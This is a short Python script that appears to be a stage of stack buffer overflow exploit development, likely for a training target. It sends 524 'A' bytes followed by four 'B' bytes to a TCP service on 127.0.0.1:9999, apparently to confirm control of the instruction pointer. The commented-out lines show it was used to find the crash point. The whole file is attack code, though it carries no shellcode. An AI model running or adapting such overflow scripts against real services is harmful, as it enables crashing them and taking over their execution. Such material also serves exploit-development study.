import socket, time, sys
buffer =''
c=524


try:
    buffer="A"*c + "B"*4
   # print(buffer)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect(('127.0.0.1',9999))
    s.recv(1024)
#    print(c," bytes sent!" )
    s.send(buffer)
    data = s.recv(1024)
    s.close()
except:
#    print("Crashed at {}".format(c))
    sys.exit()

